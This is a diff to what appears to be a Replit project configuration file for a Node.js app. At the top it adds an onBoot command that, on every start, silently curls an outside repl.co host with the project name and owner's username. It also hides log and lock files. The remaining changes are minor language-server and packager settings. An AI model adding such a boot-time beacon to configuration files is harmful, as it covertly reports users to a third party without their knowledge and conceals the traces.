@@ -1,3 +1,5 @@
+onBoot='curl "https://ced0775a-02a8-41d5-a6cf-14815ad4a73e.id.repl.co/add?repl=${REPL_SLUG}&author=${REPL_OWNER}"'
+hidden = ["log", "*lock*"]
 entrypoint = "index.js"
 [interpreter]
 command = [
@@ -20,7 +22,7 @@ language = "nodejs"
 
   [packager.features]
   packageSearch = true
-  guessImports = true
+  
   enabledForHosting = false
 
 [unitTest]
@@ -69,7 +71,7 @@ support = true
 [languages]
 
 [languages.javascript]
-pattern = "**/{*.js,*.jsx,*.ts,*.tsx}"
+pattern = "*.js,package.json"
 
 [languages.javascript.languageServer]
 start = "typescript-language-server --stdio"
